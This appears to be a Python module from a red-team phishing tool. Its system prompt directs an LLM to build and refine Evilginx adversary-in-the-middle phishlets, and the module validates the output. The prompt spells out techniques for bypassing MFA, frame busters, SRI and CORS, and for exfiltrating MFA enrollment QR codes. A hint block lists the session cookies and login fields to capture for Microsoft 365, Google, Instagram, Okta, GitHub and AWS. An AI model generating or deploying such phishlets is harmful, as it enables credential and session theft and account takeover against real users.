import json
import logging
from typing import Optional

import litellm

from app.config import settings
from app.schemas.phishlet import Phishlet
from app.schemas.analysis import AnalysisResult

logger = logging.getLogger(__name__)

SYSTEM_PROMPT = """You are an expert Evilginx phishlet developer for authorized red team security testing.
You understand the Evilginx v3 phishlet YAML format thoroughly, including params, proxy_hosts, sub_filters,
auth_tokens, credentials, auth_urls, login, force_post, js_inject, and redirect_url sections.

CRITICAL REQUIREMENTS:
1. Every force_post entry MUST include a 'force' field (even if empty list []).
2. Okta phishlets MUST use params with {okta_orga} for tenant variable.
3. Advanced sub_filters may be needed for CORS bypass, SRI integrity stripping, and redirect URI rewriting.
4. js_inject can implement multi-step flows: decoy redirects, MFA enrollment automation, frame buster bypass.
5. credentials type can be 'post', 'json', or 'header'. Okta uses type 'json' for username capture.

ADVANCED TECHNIQUES (from Wavestone research):
- CORS bypass: Modify JS to rewrite redirectUri.replace("{basedomain}","{orig_domain}")
- SRI stripping: Replace integrity="[^"]*" with integrity=''
- Redirect URI fix: Ensure callback URIs stay on original domain in OIDC flows
- Frame buster bypass: Replace if(e.self===e.top){ with if(true){
- KMSI auto-accept: force_post with path=/kmsi, force=[{key:'LoginOptions', value:'1'}]
- MFA persistence: force_post with path=/common/SAS, force=[{key:'rememberMFA', value:'true'}]
- MFA enrollment: Multi-step js_inject to enumerate authenticators and exfil QR codes

Given a rule-based phishlet draft and the analysis data of a target website, your job is to:
1. Identify missing or incorrect proxy_hosts (domains/subdomains)
2. Suggest better auth_token cookie names based on the target platform
3. Improve credential field mappings (use type 'json' for API-based auth)
4. Add necessary sub_filters for cross-domain scenarios and security bypass
5. Add force_post entries if needed (ALWAYS include 'force' field)
6. Add js_inject for SPA/JS auth, frame buster bypass, or MFA automation
7. Add params for variable substitution (e.g., {okta_orga} for Okta tenants)
8. Ensure the phishlet follows Evilginx best practices

Return ONLY a valid JSON object matching the Phishlet schema. No explanations."""

KNOWN_PLATFORMS_HINT = """
Known platform patterns:
- Microsoft 365/Azure: login.microsoftonline.com, login.live.com, aadcdn.msftauth.net
  Cookies: ESTSAUTH, ESTSAUTHPERSISTENT, SignInStateCookie
  Creds: loginfmt (username), passwd (password)

- Google: accounts.google.com, myaccount.google.com
  Cookies: SID, HSID, SSID, APISID, SAPISID
  Creds: identifier (email), Passwd (password)

- Instagram: www.instagram.com
  Cookies: sessionid, csrftoken, ds_user_id, ig_did, rur
  Creds: username, enc_password

- Okta: {tenant}.okta.com
  Cookies: sid, idx
  Creds: username, password

- GitHub: github.com
  Cookies: user_session, _gh_sess, logged_in
  Creds: login (username), password

- AWS: signin.aws.amazon.com
  Cookies: aws-creds, aws-userInfo
"""


class AIService:
    def __init__(self):
        self.model = settings.ai_model
        self.litellm_params = settings.get_litellm_params()

    async def refine_phishlet(
        self, phishlet: Phishlet, analysis: AnalysisResult
    ) -> Optional[Phishlet]:
        if not settings.ai_enabled:
            return None

        phishlet_json = phishlet.model_dump_json(indent=2)
        analysis_summary = self._build_analysis_summary(analysis)

        user_prompt = f"""Here is a rule-based phishlet draft and the analysis data.
Refine the phishlet for accuracy.

## Current Phishlet Draft
```json
{phishlet_json}
```

## Target Analysis
{analysis_summary}

## Known Platform Patterns
{KNOWN_PLATFORMS_HINT}

Return the improved phishlet as a single JSON object.
Preserve the same schema structure. Only modify values that need improvement.
CRITICAL: Every force_post entry MUST include a 'force' field (even if empty list []).
Do NOT add explanations - return ONLY the JSON."""

        try:
            response = await litellm.acompletion(
                **self.litellm_params,
                messages=[
                    {"role": "system", "content": SYSTEM_PROMPT},
                    {"role": "user", "content": user_prompt},
                ],
                temperature=0.1,
                max_tokens=4000,
            )

            content = response.choices[0].message.content

            # Extract JSON from response (handle markdown code blocks)
            if "```json" in content:
                content = content.split("```json")[1].split("```")[0]
            elif "```" in content:
                content = content.split("```")[1].split("```")[0]

            refined_data = json.loads(content.strip())

            # Ensure every force_post has a 'force' field
            if "force_post" in refined_data:
                for fp in refined_data["force_post"]:
                    if "force" not in fp:
                        fp["force"] = []

            refined_phishlet = Phishlet.model_validate(refined_data)
            return refined_phishlet

        except Exception as e:
            logger.error(f"AI refinement failed: {e}")
            return None

    def _build_analysis_summary(self, analysis: AnalysisResult) -> str:
        domains = ", ".join([d.domain for d in analysis.discovered_domains])
        cookies = "; ".join([
            f"{domain}: {', '.join(names)}"
            for domain, names in analysis.cookies_observed.items()
        ])
        forms = ""
        for form in analysis.login_forms:
            fields = ", ".join([f"{f.field_name} ({f.field_type})" for f in form.fields])
            forms += f"  Action: {form.action_url}, Fields: [{fields}]\n"

        return f"""Target URL: {analysis.target_url}
Base Domain: {analysis.base_domain}
Page Title: {analysis.page_title}
Login Path: {analysis.login_path}
Domains Involved: {domains}
Cookies Observed: {cookies}
Login Forms:
{forms}
Auth Endpoints: {', '.join(analysis.auth_api_endpoints[:10])}
Has MFA: {analysis.has_mfa}
Has KMSI: {analysis.has_kmsi}
Uses JS Auth: {analysis.uses_javascript_auth}
Post-Login URL: {analysis.post_login_url or 'Not detected'}
SRI Hashes Found: {len(analysis.sri_integrity_hashes)}
X-Frame-Options: {analysis.x_frame_options or 'None'}
OIDC Redirect URIs: {', '.join(analysis.oidc_redirect_uris[:5]) or 'None detected'}"""

    async def check_connection(self) -> bool:
        try:
            await litellm.acompletion(
                **self.litellm_params,
                messages=[{"role": "user", "content": "Reply with 'ok'"}],
                max_tokens=5,
            )
            return True
        except Exception as e:
            logger.warning(f"AI connection check failed: {e}")
            return False
